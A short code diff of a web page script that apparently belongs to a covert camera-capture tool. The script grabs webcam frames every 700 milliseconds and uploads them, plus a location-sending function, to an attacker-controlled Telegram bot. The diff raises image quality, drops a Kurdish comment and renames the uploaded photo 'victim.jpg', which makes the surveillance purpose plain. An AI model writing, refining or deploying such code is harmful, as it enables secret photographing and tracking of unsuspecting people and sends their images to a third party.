@@ -57,7 +57,7 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
@@ -75,7 +75,7 @@
         });
     }
 
-    // ئەم فەنکشنە دەمێنێتەوە بەڵام بانگ ناکرێت بۆ ئەوەی کۆدەکە تێک نەچێت
+    
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -87,7 +87,7 @@
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append(type, blob, "shot.jpg");
+        fd.append(type, blob, "victim.jpg");
         fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
     }
 </script>
